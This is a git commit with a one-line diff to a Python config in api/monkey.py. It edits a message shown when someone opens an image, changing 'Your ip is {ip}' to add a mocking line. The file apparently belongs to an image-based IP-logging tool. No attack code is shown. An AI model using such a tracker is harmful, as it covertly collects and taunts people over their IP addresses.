81e30f03e7767d1213627da30cf89cef1df5178d
rinmik0 <155125986+rinmik0@users.noreply.github.com>
2023-12-29 04:45:44 +0100

    Update monkey.py

--- api/monkey.py
+++ api/monkey.py
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "Your ip is {ip}", # Message to show
+        "message": "Your ip is {ip} check if your browser is working :P", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
